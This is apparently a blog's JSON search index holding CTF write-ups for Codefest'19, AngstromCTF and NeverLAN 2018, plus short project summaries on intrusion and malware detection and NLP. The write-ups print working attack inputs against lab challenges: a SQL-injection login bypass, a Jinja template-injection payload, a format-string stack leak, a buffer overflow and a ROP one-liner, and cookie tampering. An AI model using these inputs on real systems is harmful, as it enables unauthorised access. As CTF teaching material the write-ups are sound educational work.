obtained password isâ€Šâ€”â€Šshouldve_used_some_tool\nThe flag, hence, is CodefestCTF{shouldve_used_some_tool}\nÂ Windows RE (Reversingâ€Šâ€”â€Š500pts) In this problem, the Windows exe file (actually a .NET file) that was provided, was packed with ConfuserEx. We can use NoFuserEx, which is a free deobfuscator for this packer.\nThen, open the executable in any .NET decompiler like dnSpy and check the Form function to get the password as well as the flag.\n Passwordâ€Šâ€”â€Šthisisa1337password\n The flagâ€Šâ€”â€ŠCodefestCTF{51mp13_1npu7_v411d4710n_8u7_w17h_4_7w157}\nÂ No Fatshaming (Webâ€Šâ€”â€Š600pts) Iâ€™ll cheat a bit here xD. You can read my friend Yashitâ€™s awesome writeup on the challenge.\nFlag isâ€Šâ€”â€ŠCodefestCTF{1AmTeHHHAX00Rr4uj8rfi4e$%y5yhrf}\nHope you had a great time solving the challenges and that it was a good learning experience for beginners.\nFollow me on Twitter, Github or connect on LinkedIn.\n","date":1566760385,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041686,"objectID":"0089a9c6c06237869357602a9fc17b24","permalink":"/post/2019-08-25_codefest19-ctf-writeups/","publishdate":"2019-08-25T19:13:05.36Z","relpermalink":"/post/2019-08-25_codefest19-ctf-writeups/","section":"post","summary":"The Capture the Flag event for Codefestâ€™19 was hosted from 8 pm, 23rd August 2019 to 12 noon, 24th August 2019 on Hackerrank.\nThe contest link can be found here. There were a total of 1532 registrations and 518 people who were successful in solving atleast one challenge.\nSo, onto the writeups.\nWelcome to Codefest 19! (Intro Challengeâ€Šâ€”â€Š100pts) This was the introductory challenge. I had tried to make it a bit difficult than the normal introductory challenges, but I felt that it proved to be a bit difficult for the beginners.","tags":["ctf","information security","infosec","writeups"],"title":"Codefestâ€™19 CTF Writeups","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"A study on fooling Machine Learning/Deep Learning based Network Intrusion Detection systems to prevent them from detecting intrusions. We implement various adversarial machine learning attacks on network traffic data and analyze their effect on the accuracy of the model in detecting intrusions.\n","date":1557057510,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557057510,"objectID":"e785c7271041ad26f37d23d121dadc2a","permalink":"/project/nids/","publishdate":"2019-05-05T17:28:30+05:30","relpermalink":"/project/nids/","section":"project","summary":"A study on fooling Machine Learning/Deep Learning based Network Intrusion Detection systems to prevent them from detecting intrusions","tags":["nids","deep learing","machine learning","neural networks","information security","adversarial machine learning"],"title":"Network Intrusion Detection in an Adversarial setting","type":"project"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"Implemented various papers on Linux Malware detection, where I analysed the structure of ELF files to determine whether they were malicious or benign. Approaches included the analysis of -\n Symbol Table Opcode frequency ELF file metadata  ","date":1546519033,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1546519033,"objectID":"d1283dcc6d71ee2ff4c1de6da8f4bce9","permalink":"/project/linux-malware/","publishdate":"2019-01-03T18:07:13+05:30","relpermalink":"/project/linux-malware/","section":"project","summary":"Implemented various papers on Linux Malware detection, where I analysed the structure of ELF files to determine whether they were malicious or benign. Approaches included the analysis of -\n Symbol Table Opcode frequency ELF file metadata  ","tags":["malware","machine learning","information security","reverse engineering"],"title":"Linux Malware detection using Machine Learning","type":"project"},{"authors":["Shreyansh Singh"],"categories":["Natural Language Processing"],"content":"A shared task organized at ACL 2018 (Association for Computational Linguistics, Melbourne, Australia). The task aims to determining the word order and inflecting words from given unordered Universal Dependencies (UD) structures from which word order information has been removed and the tokens have been lemmatized. Worked on techniques like Language Modelling and Neural Machine Translation methods to solve the problem of reinflection and correct word order generation.\n","date":1532344948,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1532344948,"objectID":"adc5aec5c95f4bdaa39bf007e922c0ef","permalink":"/project/msr-nlg/","publishdate":"2018-07-23T16:52:28+05:30","relpermalink":"/project/msr-nlg/","section":"project","summary":"Our system for a Narural Language Generation based shared task organized at ACL 2018 (Association for Computational Linguistics, Melbourne, Australia).","tags":["nlp","nlg","neural networks","ai","deep learning","language model"],"title":"Multilingual Surface Realization for NLG","type":"project"},{"authors":["Shreyansh Singh","Ayush Sharma","Avi Chawla","A.K. Singh"],"categories":null,"content":"","date":1530383400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1530383400,"objectID":"7dfe204aa4b818105acd6c326b606aa0","permalink":"/publication/singh-etal-2018-iit/","publishdate":"2018-07-01T00:00:00+05:30","relpermalink":"/publication/singh-etal-2018-iit/","section":"publication","summary":"This paper describes our submission system for the Shallow Track of Surface Realization Shared Task 2018 (SRSTâ€²18). The task was to convert genuine UD structures, from which word order information had been removed and the tokens had been lemmatized, into their correct sentential form. We divide the problem statement into two parts, word reinflection and correct word order prediction. For the first sub-problem, we use a Long Short Term Memory based Encoder-Decoder approach. For the second sub-problem, we present a Language Model (LM) based approach. We apply two different sub-approaches in the LM Based approach and the combined result of these two approaches is considered as the final output of the system.","tags":null,"title":"IIT (BHU) Varanasi at MSR-SRST 2018: A Language Model Based Approach for Natural Language Generation","type":"publication"},{"authors":null,"categories":["Information Security"],"content":"These are the writeups to the problems I solved during the AngstromCTF.\n MISC Â 1. Waldo1\nWe are given a zip fileâ€Šâ€”â€Šflags.zip containing flags of countries. The file flag5.png, we see on opening has the flag.\n   Flag-Waldo1   Â 2. Waldo2\nIn this problem, we are given multiple flag images in a folder. Judging by the problem, it seems that one image is different. We see the md5 hash of the few files which are the same-9f6e902c233020026caf0ebbb1cf0ff5. So we write the following script-\n So, the filename we get is waldo339.jpg. Running strings on the file we get the flag asâ€Šâ€”â€Šactf{r3d_4nd_wh1t3_str1p3s}.\nÂ 3. Thatâ€™s not my name\nWe are given a pdf fileâ€Šâ€”â€Šgettysburg.pdf, but on trying to open it, it does not open, giving incorrect file format error. We run binwalk on the file to see that it infact is a docx file. We change the extension to .docx anf on opening we get the flag asâ€Šâ€”â€Šactf{thanks_mr_lincoln_but_who_even_uses_word_anymore}.\nÂ 4. File Transfer\n   Capture   The highlighted packet shows a JPEG image capture. We export the JPEG as bytes to get the image.\n   Flagâ€Šâ€”â€ŠFile Transfer   Â 5. GIF\nOn running binwalk on the given image, we see that it is infact a collection of many images.\nSo , we run the command binwalk -D 'png image:png' jiggs.gif.png. On inspecting the extracted files, we see an image which has the flag.\n   Flagâ€Šâ€”â€ŠGif    Crypto Â 1. Warmup\nFrom the term fine cipher, we get the hint that it could be an Affine cipher. We use an online Affine cipher solver to get the flag asâ€Šâ€”â€Šactf{it_begins}.\nÂ 2. Back to Base-ics\nWe are given the following cipher text -\n   Ciphertext   Now we can easily see that the Part 1 is binary(base 2) and Part 3 is hexadecimal(base 16). On decoding them using any online converter, we get\nPart 1: actf{0ne_tw0_f0\nPart 3: n_th1rtytw0_s1x\nAlso judging from the title of the problem, we can say that all the ciphers have the base of some power of two. We guess that Part 2 could be base 8(octal). using an online octal to text converter we get,\nPart 2: ur_eight_sixt33\nThe last one looks like base64. On decrypting, we get\nPart 4: tyf0ur_no_m0re}\nSo, the flag isâ€Šâ€”â€Šactf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}\nÂ 3. XOR\nThis looks like a singlebyteXOR problem. We use the following script\n On seeing all the plain texts, we get the flag asâ€Šâ€”â€Šactf{hope_you_used_a_script}.\nÂ 4. Intro to RSA\nThis is a classical RSA problem, we use the following script to decrypt\n So the flag isâ€Šâ€”â€Šactf{rsa_is_reallllly_fun!!!!!!}.\n WEB Â 1. Source Me 1\nHere, we are presented with a login page. On inspecting the source, we find the password â€”f7s0jkl, in the comments. **** So, we login with the username as admin and password as f7s0jkl.\nThis gives us the flag-actf{source_aint_secure}.\nÂ 2. Get Me\nInitially all we have is a button with the message that only authorized users are allowed to pass. On clicking the button, we get the message that we are not authorized. However in the url bar we see that the get parameter is auth=false. We change it to auth=trueand hit enter.\nWe then get the flagâ€Šâ€”â€Šactf{why_did_you_get_me}.\nÂ 3. Sequel\nThis is a classic case of SQL injection(SQLi). The hint here is the name of the problem which is pronunciation of SQL.\nWe enter both username and password as 'or''='.\nThis gives us the flagâ€Šâ€”â€Šactf{sql_injection_more_like_prequel_injection}.\nÂ 4. Source Me 2\nWe are give another login page. Here, too, the username is admin. On inspecting the source, we find the script which converts our entered password to md5 and compares it to the hash bdc87b9c894da5168059e00ebffb9077. We use an online md5 decryptor to get the password as password1234. Entering this gives the flagâ€Šâ€”â€Šactf{md5_hash_browns_and_pasta_sauce}.\nÂ 5. Madlibs\nHere, from the Flask code we see that there is a variable app.secret_key, which is basically a config variable. So we head to Tale of a Person section and enter {{config}} as the Author name and any random strings in the other options.\n   Here we see the SECRET_KEY variable assigned to the flag, actf{wow_ur_a_jinja_ninja}\n Reversing(RE) Â 1. Rev1\nFirst, we run strings on the given ELF executable. We see the string, s3cret_pa55word. This could be the secret password the program is looking for. On running the executable and giving the above string as key, we get the flag. This is to be done on the shell server.\nÂ 2. Rev2\nThe ELF on executing asks for a number to be guessed. We use radare2 to disassemble the code.\n      The highlighted hex, 0x11d7 is 4567 in decimal. On entering this, the program now asks us to give two two-digit numbers. We again analyze the disassembled code.\n   This tells us that the product of the two numbers should be 0xd67 i.e 3431. From this link, we find that the numbers are 47 and 73. We enter them in ascending order, i.e 47 and then 73.\nWe get the flag asâ€Šâ€”â€Šactf{4567_47_73}.\n Binary Â 1. Accumulator\nHere the ideas is to keep adding integers to an int variiable and without explicitly entering negative values, we have to make the result negative. This can be done by integer overflow.\n   Running these inputs on the shell server will give us the flag.\nÂ 2. Cookie Jar\nThis is a buffer overflow problem. Although we never explicitly gave a value to numCookie, we can overflow the buffer so that it gets a value. I fwe the following inputâ€Šâ€”â€Šaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa99999998 to the program, we get the flag.\nThe flag isâ€Šâ€”â€Šactf{eat_cookies_get_buffer}.\nÂ 3. Number Guess\nWe take the help of the hint given. The most common vulnerability of the printf function is the use(or not) of format strings.\nIn the code, just before the printf(buf) the two random integers are initialized. So, when we are asked for our name, if we give the following input, %d %d %d %d %d %d %d %d %d %d %d %d . This would give us the other numbers in the stack. On running this, we take the 3rd and the 9th value as rand1 and rand2. We add them and give the result as our guess.\n   So the flag is -actf{format_stringz_are_pre77y_sc4ry}.\nÂ 4. Rop to the Top\nThis is an example of Return Oriented Programming (ROP) vulnerability which is basically buffer overflow to access the non-executable stack. To exploit it we can use the following set of commands-\n   We find that the address of the_top function is 0x8048db. Also the buffer size is 0x28.\nSo, the following command works for us-\n./rop_to_the_top32 \u0026ldquo;$(python -c \u0026lsquo;print \u0026ldquo;A\u0026rdquo;*0x28 + \u0026ldquo;BBBB\u0026rdquo; + \u0026ldquo;\\xdb\\x84\\x04\\x08\u0026rdquo;')\u0026quot;\nWe enter the character â€˜Aâ€™ to fill the size of the buffer, â€œBBBBâ€ to replace the current stack pointer (%ebx) followed by the address to which we wish to point to, here the address of the_top function.\nRunning the above command on the shell server gives us the flag.\n For more writeups, you can follow me on Github\n","date":1521808624,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041664,"objectID":"471b26bb4249728777987eb7deb93689","permalink":"/post/2018-03-23_angstromctf-writeups/","publishdate":"2018-03-23T12:37:04.861Z","relpermalink":"/post/2018-03-23_angstromctf-writeups/","section":"post","summary":"These are the writeups to the problems I solved during the AngstromCTF.\n MISC Â 1. Waldo1\nWe are given a zip fileâ€Šâ€”â€Šflags.zip containing flags of countries. The file flag5.png, we see on opening has the flag.\n   Flag-Waldo1   Â 2. Waldo2\nIn this problem, we are given multiple flag images in a folder. Judging by the problem, it seems that one image is different.","tags":["ctf","information security","infosec","writeups"],"title":"AngstromCTF Writeups","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"These are the writeups of the problems I solved over the weekend for the NeverLAN CTF 2018.\n Scripting Challenges Â 1. Basic Math\nWe are given a file with some numbers which we had to sum.\n   File   So, we write a simple python script to do it.\n This gives the flagâ€Šâ€”â€Š49562942146280612\nÂ 2. More Basic Math\nThis time we have a larger list of numbers. However, we can just run the script again on the new file.\nThis gives us the flagâ€Šâ€”â€Š50123971501856573397\nÂ 3. Even more Basic Math with some junk\nIn this file, we see that we have spaces, commas and even English words in between the file. Using any text editor, we replace the commas with a space, and then write a script to replace all spaces with new lines.\n Then we run our first script again. We find two or three English words which give Value Error when the script is run. For them, we can manually remove them.\nFinally, we get the flagâ€Šâ€”â€Š34659711530484678082\nÂ 4. JSON Parsing 1\nOn analysing the file, we find that each line is a JSON. We have to find the 5 AV engines which had the highest detection ratio (not detection count) in that file.\nWe write the following script to do that â€”\n The last five in the list are â€”\n   High Detection Ratio AV engines   So the flag isâ€Šâ€”â€ŠSymantecMobileInsight,CrowdStrike,SentinelOne,Invincea,Endgame\n Reversing Challenges Â 1. Commitment Issues\nThe first thing which came to my mind is to run strings on the file. I did, and got the flagâ€Šâ€”flag{donâ€™t_string_me_along_man!}\n Interweb Challenges Â 1. ajax_not_soap\nOn inspecting the script(ajax) of the webpage, we find that the form compares our username and password with one that is stored at the endpoint /webhooks/get_username.php. On going to that link we find the username as MrClean.\nAlso the password is also checked by the endpoint /webhooks/get_pass.php?username=*username* Replacing username with MrClean we get the password (also the flag) as flag{hj38dsjk324nkeasd9}\nÂ 2. the_red_or_blue_pill\nThe page says we can either take the red pill(endpoint ?red ) or the blue pill(endpoint ?blue ) but not both. We enter the endpoint as ?red\u0026amp;blue to get the flag as flag{breaking_the_matrixâ€¦I_like_it!}\nÂ 3. ajax_not_borax\nThis problem is very similar to ajax_not_soap with the difference here that when we go to the endpoint /webhooks/get_username.php?username=, we are presented with a hash (c5644ca91d1307779ed493c4dedfdcb7). We use an online MD5 decryptor to get the value as tideade. Then, when we go to the endpoint /webhooks/get_pass.php?username=tideade, we get a base64 encoded string, which on decryption gives the flag as flag{sd90J0dnLKJ1ls9HJed}\nÂ 4. Das_blog\nFirst, when we are presented with a login page, we find that a testing credential is available as a comment in the HTML. We login using those credentials. Then, we find that the cureent permission is DEFAULT. We need admin permissions to view the flag. On inspecting the cookies, we find that there is a cookie permission which has its value as user. We use the EditThisCookie plugin to change its value to admin. On refreshing, we get the flag as a blog post flag{C00ki3s_c4n_b33_ch4ng3d_?}\n Passwords Challenges Â 1. Encoding != Hashing\nWe are given a pcap capture. We open this in Wireshark and analyse the HTTP packets using the http filter. On reading the contents of the filtered packets, we find the flag.\n   Wireshark Packets analysis   The flag is flag{help-me-obiwan}\n Trivia Challenges Â 1. Can you Name it?\nProblemâ€”â€ŠThis system provides a reference-method for publicly known information-security vulnerabilities and exposures.\nAnswerâ€”â€ŠCommon Vulnerabilities and Exposures\nÂ 2. Can you find it? (Bonus)\nProblemâ€”â€ŠThis Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.\nAnswerâ€”â€ŠEternalBlue. And the ransomware was WannaCry.\nÂ 3. Yummyâ€¦\nProblemâ€”â€ŠThese store small pieces of data sent from a website to the userâ€™s computer. This yummy sounding things are stored by the userâ€™s web browser while the user surfing the web. Answer is non-singular.\nAnswerâ€”â€ŠCookies\nÂ 4. Can you find it?\nProblemâ€”â€ŠThis Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.\nAnswerâ€”â€ŠThe formal listing code (CVE) for EternalBlue is CVE-2017â€“0144\nÂ 5. Can you search it?\nProblemâ€”â€ŠFor the Vulnerability you found in question 2, There is a proof of concept. What is the string for TARGET_HAL_HEAP_ADDR_x64?\nAnswerâ€”â€ŠThe vulnerability being discussed is EternalBlue. We canf ind the source code at this link. There we find that TARGET_HAL_HEAP_ADDR_x64 is assigned 0xffffffffffd00010\nÂ 6. Who knew?\nProblemâ€”â€ŠThis product had Highest Number Of â€œDistinctâ€ Vulnerabilities in 1999\nAnswerâ€”â€ŠA simple Google search of â€œHighest Number Of â€œDistinctâ€ Vulnerabilities in 1999\u0026quot;, gets us the following link. The product with the highest vulnerabilities was Windows NT\n Blast from the Past Challenges 1. cookie_monster\nOn inspecting the cookies, we find that the Cookie value should be the Red Guyâ€™s name. We change the value of the cookie to Elom. On refreshing the page, we get the flag as flag{C00kies_4r3_the_b3st}\n","date":1519721758,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041659,"objectID":"3bb2f739ac0a171e988d00372c0b0d0d","permalink":"/post/2018-02-27_neverlan-ctf-2018-writeups/","publishdate":"2018-02-27T08:55:58.711Z","relpermalink":"/post/2018-02-27_neverlan-ctf-2018-writeups/","section":"post","summary":"These are the writeups of the problems I solved over the weekend for the NeverLAN CTF 2018.","tags":["ctf","information security","infosec","writeups"],"title":"NeverLAN CTF 2018 Writeups","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Natural Language Processing"],"content":"Work done as a part of the organizing team of RevOpiD, a shared task organized at IJCNLP 2017 (International Joint Conference on Natural Language Processing, Taipei, Taiwan). The task aims to produce a top-k ranking of product reviews which can sufficiently represent the gist of opinions expressed in all the reviews of that product. Implemented the official baseline for Subtask-B of the shared task. Also volunteered to annotate gold dataset for the shared task.\n","date":1511178345,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1511178345,"objectID":"a82704abc404cb5c05956f7caaafd136","permalink":"/project/revopid/","publishdate":"2017-11-20T17:15:45+05:30","relpermalink":"/project/revopid/","section":"project","summary":"Baseline model for RevOpiD, a shared task organized at IJCNLP 2017 (International Joint Conference on Natural Language Processing, Taipei, Taiwan).","tags":["nlp","information retrieval","ir","sentiment analysis"],"title":"Review Opinion Diversificatio\u0026shy;n","type":"project"},{"authors":["Shreyansh Singh"],"categories":["Application Development"],"content":"Created a social networking website (webapp) using the Django framework as a part of my curriculum project.\nImplemented features like user authentication, profile creation and edit options, posts/blogs creation, like and comment on the posts, searching other users, personal messaging between users, following other users and a meme generator for generating memes.\n","date":1508503460,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1508503460,"objectID":"2c44d8f0a9b686d065012cee7feec1a4","permalink":"/project/worldlink/","publishdate":"2017-10-20T18:14:20+05:30","relpermalink":"/project/worldlink/","section":"project","summary":"A social networking website made using Django","tags":["web development","django","python"],"title":"Worldlink - Social Networking Website","type":"project"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"e60558bac1291bdc4d083e39d50c375e","permalink":"/tags/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/tags/","section":"","summary":"Popular tags","tags":null,"title":"Tags","type":"widget_page"}]